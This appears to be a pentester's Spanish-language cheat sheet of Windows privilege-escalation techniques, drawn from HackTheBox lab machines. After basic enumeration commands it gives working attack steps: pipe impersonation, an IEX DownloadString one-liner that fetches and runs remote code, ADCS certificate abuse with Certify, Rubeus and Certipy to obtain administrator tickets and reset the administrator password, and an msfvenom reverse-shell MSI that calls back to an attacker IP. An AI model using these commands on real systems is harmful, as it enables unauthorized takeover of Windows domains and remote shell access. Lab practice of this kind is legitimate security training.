	#### Windows
https://lolbas-project.github.io/#
#Binarios windows

----------      ----------      ----------      ----------
	### Comandos de busqueda/enumeracion basicos
icacls <archivo>
#Lista los permisos que tiene ese archivo
dir -force
#Listar contenido oculto en un directorio
net user <user>
#Nos muestra la informacion de nuestro usuario: nombre, grupo, etc
#Net user sin especificar usario para ver todos los usuarios
net localgroup <nombbre local group>
#Nos muetra info del grupo, comentario, etc
whoami /priv
#Permite lista los privilegios
whoami /all
#Muestra toda la info dde nuestro perfil de usr
reg query HKLM\SYSTEM\CurrentControlSet\Services\<service>
#Devuelve informaacion del servicio consultado

----------      ----------      ----------      ----------
	###Lugares a revisar
##winpeas.ps1
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
#Escanea el sistema en busqueda de posibles vulnerabilidades

tasklist
#Procesos corriendo en el sistema
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#Enumerar registros de Windows
netsh advfirewall show currentprofile
#Muestra las reglas de firewall. Es util para saber si estan bloqueadas algunas conexiones ya sea entrantes, salientes o ambas

----------      ----------      ----------      ----------
### Privilegios a considerar -> whoami /priv
icacls <file name>
#Permite ver los privilegios del archivo

## SeImpersonatePrivilege
Si existe este privilegio y es un windows server anterior a 2019 usar Juicy Potato
-> En el caso de no saber que windows es y no poder usar systeminfo se puede usar: reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName

maquina:hackback (s4vitar writeup)
git clone https://github.com/decoder-it/pipeserverimpersonate.git
#En el caso de que windows server sea 2019 o superior usar este tool para saber a quien impersonar e impersonarlo
#La idea de este tool es que el usuario al que queremos impersonar se conecte a nuestro pipe
#Debe subirse el pipeserverimpersonate.ps1 a la maquina target
\\.\pipe\dummypipe
#El ppipe name por defautl del tool ese dummypipe. Esto es el path al pipe
./pipeserverimpersonate.ps1
#Se ejecuta y espera en escucha
#Sirve para que el proceso que se ejecuta cada X tiempo se autentique contra el pipe
-> Para ver contexto de esto visitar HAckback s4vitar writeup 2:20:00
Cuando se autentique vamos a saber a que usuario podemos impersonar. A partir de aca podemos agregar comandos al .ps1 para que lo ejecute el usr

we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
#Buscar este comentario en el .ps1 para agregar comandos por debajo de esa la linea que se ejecutaran como el usuario a imperonar

## SeMachineAccountPrivilege
Ver ADCS con certipy

----------      ----------      ----------      ----------
=======
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
#Buscar historial de consola ps
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#Enumerar registros de Windows
C:\SQLServer\logs
#En esta ruta o similares puede haber logs de errores de coneccion a la base de datos en caso de usarse

----------      ----------      ----------      ----------
	### Grupos de interes
## LAPS_reader
https://github.com/kfosaaen/Get-LAPSPasswords/tree/master
#Es un grupo que si un usuario pertenece va a poder ver las contraseÃ±as. Para ello clonamos el repo y ejecutamos el .ps1 en la maquina windows
IEX(New-Object Net.WebClient).DownloadString('https://url')
#De esta forma descargamos y ejecutamos de una lo que compartimos mediante un sv

## Remote management user
Permite la coneccion al usuario con usr y pswd sin necesiadad de certificados o keys.
Para ver forrmas de coneccion mediante evil-winrm visitar attacking_winrm.txt

----------      ----------      ----------      ----------
	### ADCS: Certificates
## Certify.exe
https://github.com/GhostPack/Certify
#Para ver como saber si ADCS esta en uso ver attacking_ldap.txt
upload Certify.exe
#Subir .exe mediante winrm a la maquina windows
.\Certify.exe find /vulnerable /currentuser
#Usar con y sin la flag currentuser
#En el README esta "three following issues" con ejemplos y explicacion de los problemas de permisos en certificados
#Se busca por: ManageCA, PEND_ALL_REQUESTS y ENROLLEE_SUPPLIES_SUBJECT

.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
#Ejemplo de atacando el escenario 3
#Devuelve un certificado que debemos copiar y usar con openssl
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
#pwd blank si pregunta por una
#El certificado de output se sube a la maquina
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
#Se realiza request para obtener el TGT como administrator
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
#En el caso de que Rubeus no nos genere una sesion como administrator voy a soliciar la credencial con la flag /getcredentials

##Certipy
-> Maquina authority
-> Vuln por priv: SeMachineAccountPrivilege
certipy req -u "test1$" -p "secret" -ca AUTHORITY-CA -dc-ip 10.10.11.222 -target authority.htb -template CorpVPN -upn Administrator@authority.htb
#Una vez agregada la computadora mediante impacket, requesteo pfx de la computadora de dominio creada
certipy cert -pfx administrator.pfx
#Una vez generado el .pfx con esto gener key y cert
python3 passthecert.py -action modify_user -dc-ip 10.10.11.222 -crt ../../user_crt -key ../../user_key -domain authority.htb -target administrator -new-pass
#Cambio password del usr administrator


msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
#Creo una reverse .msi
msiexec /quiet /qn /i rev.msi
#Ejecuto la reverse en el target para obtener shell como root en mi listener
